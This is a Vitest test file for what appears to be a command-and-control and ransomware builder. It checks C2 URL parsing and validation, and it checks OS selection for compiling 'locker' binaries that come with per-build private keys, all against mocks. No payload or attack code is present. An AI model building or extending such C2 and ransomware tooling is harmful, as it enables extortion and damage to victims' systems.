import { describe, it, expect, beforeEach } from "vitest";
import { C2CompilerService } from "../../../src/infra/adapters/c2/C2CompilerService.js";
import { CompileC2UseCase } from "../../../src/application/c2/use-cases/CompileC2UseCase.js";
import { CompileRansomUseCase } from "../../../src/application/ransom/use-cases/CompileRansomUseCase.js";
import { MockC2Compiler } from "../../mocks/MockC2Compiler.js";
import { MockRansomCompiler } from "../../mocks/MockRansomCompiler.js";
import { Result } from "../../../src/shared/Result.js";

describe("C2CompilerService._parseUrl", () => {
  let service: any;

  beforeEach(() => {
    service = new C2CompilerService();
  });

  it("should parse ws:// URL correctly", () => {
    const result = service._parseUrl("ws://192.168.1.100:4444/c2");

    expect(result).not.toBeNull();
    expect(result.host).toBe("192.168.1.100");
    expect(result.port).toBe(4444);
    expect(result.path).toBe("/c2");
  });

  it("should parse wss:// URL correctly", () => {
    const result = service._parseUrl("wss://secure.example.com:9999/ws");

    expect(result).not.toBeNull();
    expect(result.host).toBe("secure.example.com");
    expect(result.port).toBe(9999);
    expect(result.path).toBe("/ws");
  });

  it("should parse http:// URL correctly", () => {
    const result = service._parseUrl("http://10.0.0.1:8080/relay");

    expect(result).not.toBeNull();
    expect(result.host).toBe("10.0.0.1");
    expect(result.port).toBe(8080);
    expect(result.path).toBe("/relay");
  });

  it("should parse https:// URL with explicit non-default port", () => {
    const result = service._parseUrl("https://relay.example.com:8443/c2");

    expect(result).not.toBeNull();
    expect(result.host).toBe("relay.example.com");
    expect(result.port).toBe(8443);
    expect(result.path).toBe("/c2");
  });

  it("should default to 443 for https URLs", () => {
    const result = service._parseUrl("https://relay.example.com/c2");

    expect(result).not.toBeNull();
    expect(result.port).toBe(443);
  });

  it("should add ws:// prefix when no protocol is given", () => {
    const result = service._parseUrl("localhost:4444");

    expect(result).not.toBeNull();
    expect(result.host).toBe("localhost");
    expect(result.port).toBe(4444);
  });

  it("should default to port 4444 when no port specified", () => {
    const result = service._parseUrl("ws://relay.local");

    expect(result).not.toBeNull();
    expect(result.port).toBe(4444);
  });

  it("should default path to / when no path specified", () => {
    const result = service._parseUrl("ws://localhost:4444");

    expect(result).not.toBeNull();
    expect(result.path).toBe("/");
  });

  it("should parse bare hostname without port", () => {
    const result = service._parseUrl("myserver.com");

    expect(result).not.toBeNull();
    expect(result.host).toBe("myserver.com");
    expect(result.port).toBe(4444);
  });

  it("should return null for completely invalid URL", () => {
    const result = service._parseUrl("://");

    expect(result).toBeNull();
  });

  it("should parse URL with deep path", () => {
    const result = service._parseUrl("ws://host:4444/api/v1/c2");

    expect(result).not.toBeNull();
    expect(result.path).toBe("/api/v1/c2");
  });

  it("should handle IPv6 address", () => {
    const result = service._parseUrl("ws://[::1]:4444/c2");

    expect(result).not.toBeNull();
    expect(result.host).toBe("[::1]");
    expect(result.port).toBe(4444);
  });
});

describe("CompileC2UseCase — URL validation", () => {
  let compiler: MockC2Compiler;
  let useCase: CompileC2UseCase;

  beforeEach(() => {
    compiler = new MockC2Compiler();
    useCase = new CompileC2UseCase(compiler);
  });

  const noop = () => {};

  it("should reject empty URL", async () => {
    const result = await useCase.execute("", noop);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("URL inválida");
    expect(compiler.calls).toHaveLength(0);
  });

  it("should reject URL without valid protocol", async () => {
    const result = await useCase.execute("ftp://server:4444", noop);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("URL inválida");
  });

  it("should reject bare hostname without protocol", async () => {
    const result = await useCase.execute("just-a-hostname", noop);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("URL inválida");
  });

  it("should accept ws:// protocol", async () => {
    const result = await useCase.execute("ws://localhost:4444", noop);

    expect(result.isSuccess).toBe(true);
    expect(compiler.calls).toEqual(["ws://localhost:4444"]);
  });

  it("should accept wss:// protocol", async () => {
    const result = await useCase.execute("wss://secure.example.com:4444", noop);

    expect(result.isSuccess).toBe(true);
    expect(compiler.calls).toEqual(["wss://secure.example.com:4444"]);
  });

  it("should accept http:// protocol", async () => {
    const result = await useCase.execute("http://localhost:8080", noop);

    expect(result.isSuccess).toBe(true);
  });

  it("should accept https:// protocol", async () => {
    const result = await useCase.execute("https://relay.example.com", noop);

    expect(result.isSuccess).toBe(true);
  });

  it("should reject gibberish string", async () => {
    const result = await useCase.execute("not a valid url at all", noop);

    expect(result.isFailure).toBe(true);
  });
});

describe("CompileRansomUseCase — SO validation", () => {
  let compiler: MockRansomCompiler;
  let useCase: CompileRansomUseCase;

  beforeEach(() => {
    compiler = new MockRansomCompiler();
    useCase = new CompileRansomUseCase(compiler);
  });

  it("should accept 'linux' as valid SO", async () => {
    const result = await useCase.execute("linux");

    expect(result.isSuccess).toBe(true);
    expect(compiler.calls).toEqual(["linux"]);
  });

  it("should accept 'windows' as valid SO", async () => {
    compiler.result = Result.ok({
      binaryPath: "/tmp/builds/789/locker_win.exe",
      buildId: "789",
      privKeyPem: "-----BEGIN PRIVATE KEY-----\nWIN\n-----END PRIVATE KEY-----\n",
    });

    const result = await useCase.execute("windows");

    expect(result.isSuccess).toBe(true);
    expect(compiler.calls).toEqual(["windows"]);
  });

  it("should reject invalid SO", async () => {
    const result = await useCase.execute("macos" as any);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("SO inválido");
  });

  it("should reject empty string SO", async () => {
    const result = await useCase.execute("" as any);

    expect(result.isFailure).toBe(true);
    expect(result.error).toContain("SO inválido");
  });

  it("should not call compiler for invalid SO", async () => {
    await useCase.execute("android" as any);

    expect(compiler.calls).toHaveLength(0);
  });

  it("should work without onLog callback", async () => {
    const result = await useCase.execute("linux");

    expect(result.isSuccess).toBe(true);
  });

  it("should pass compiler errors through", async () => {
    compiler.result = Result.fail("Docker daemon not running");

    const result = await useCase.execute("linux");

    expect(result.isFailure).toBe(true);
    expect(result.error).toBe("Docker daemon not running");
  });
});
